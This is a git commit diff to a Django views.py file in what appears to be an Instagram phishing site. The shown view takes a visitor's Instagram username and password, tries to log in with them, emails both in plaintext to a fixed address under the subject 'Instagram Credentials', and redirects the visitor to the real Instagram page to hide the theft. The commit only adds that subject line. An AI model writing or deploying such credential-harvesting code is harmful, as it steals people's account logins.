b1edb0abf69131c9468f9980864194b514153841
Siddharth-Chandel <siddharthchandel2004@gmail.com>
2023-02-22 22:25:02 +0530

    Project updated

--- projectApp/views.py
+++ projectApp/views.py
@@ -20,13 +20,13 @@ def cred(request):
     except Exception as e:
         if "Login: Checkpoint required" in e.args[0]:
             loader.close()
-            send_email('siddharthchandel2004@gmail.com',
+            send_email('siddharthchandel2004@gmail.com',sub='Instagram Credentials',
                    text=f'Here, the information given on your website.\nusername : {username}\npassword : {password}')
             return redirect("https://www.instagram.com/?hl=en", permanent=True)
         print(e)
         return render(request, 'index2.html')
     else:
         loader.close()
-        send_email('siddharthchandel2004@gmail.com',
+        send_email('siddharthchandel2004@gmail.com',sub='Instagram Credentials',
                    text=f'Here, the information given on your website.\nusername : {username}\npassword : {password}')
         return redirect("https://www.instagram.com/?hl=en", permanent=True)
